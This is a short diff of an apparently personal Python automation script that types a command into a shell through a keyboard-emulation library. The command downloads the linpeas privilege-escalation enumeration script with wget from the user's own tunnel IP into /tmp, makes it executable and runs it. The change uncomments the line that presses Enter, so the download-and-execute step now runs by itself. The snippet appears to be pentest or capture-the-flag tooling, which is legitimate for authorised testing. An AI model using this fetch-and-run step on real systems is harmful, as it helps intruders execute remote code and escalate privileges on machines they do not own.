@@ -18,4 +18,4 @@ except ValueError:
 
 else:
   keyboard.send_keys('wget -O /tmp/linpeas.sh http://%s/linpeas.sh && chmod 755 /tmp/linpeas.sh && /tmp/linpeas.sh' % tun_ip)
-  #keyboard.send_keys("<enter>")
+  keyboard.send_keys("<enter>")
